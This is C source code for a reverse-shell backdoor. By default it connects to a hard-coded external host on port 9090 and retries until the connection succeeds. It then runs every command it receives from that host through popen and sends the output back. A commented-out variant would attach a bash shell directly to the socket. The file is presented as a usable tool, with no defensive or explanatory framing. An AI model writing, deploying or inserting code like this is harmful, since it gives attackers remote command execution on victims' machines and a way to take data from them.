#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>

const int MAXSIZE = 65536;
const int PATH_MAX = 128000;

in_addr_t htoip(char* hostname){
	char* ip = calloc(20, sizeof(*ip));
	struct hostent* hostent_ = gethostbyname(hostname);
	struct in_addr** addr_list = (struct in_addr**) hostent_->h_addr_list;
	int i = 0;
	for(i = 0; addr_list[i] != NULL; i++){
		strcpy(ip, inet_ntoa(*addr_list[i]));
	}
	return inet_addr(ip);
}

int main(int argc, char** argv){
	in_addr_t address__;
	short int portno;
	if(argc < 3){
		address__ = htoip("oples.ml");
		portno = 9090;
	}
	else{
		address__ = htoip(argv[1]);
		portno = atoi(argv[2]);
	}

	int client_sock = socket(AF_INET, SOCK_STREAM, 0);
	struct sockaddr_in server_addr;
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.s_addr = address__;
	server_addr.sin_port = htons(portno);

	int connectie = connect(client_sock, (struct sockaddr *) &server_addr, sizeof(server_addr));
	while(connectie < 0){
		printf("Failed to connect. Retry\n");
		sleep(2);
		connectie = connect(client_sock, (struct sockaddr *) &server_addr, sizeof(server_addr));
	}
/*
	int pid = fork();
	if(pid > 0){
		wait(NULL);
	}
	else{
		dup2(client_sock, 0);
		dup2(client_sock, 1);
		execve("/bin/bash", NULL, NULL);

	}
*/
	char* command = calloc(65000, sizeof(*command));
	char* result = calloc(65000, sizeof(*result));
	FILE* pipe = NULL;
	size_t len;
	fflush(stdin);
	fflush(stdout);
	fflush(stderr);
	dup2(client_sock, 2);
	while(read(client_sock, command, 65000) > 0){
		printf("I received %s\n", command);
		pipe = popen(command, "r");
		if (NULL == pipe) {
    	perror("pipe");
    	exit(1);
		}
		printf("\t_______\n");
		while(fgets(result, 65000, pipe) != 0){
			printf("%s", result);
			write(client_sock, result, strlen(result));
		}
		write(client_sock, NULL, 1);
		printf("\n\t_______\n");
		pclose(pipe);

		bzero(result, 65000);
		bzero(command, 65000);
	}
	return 0;
}
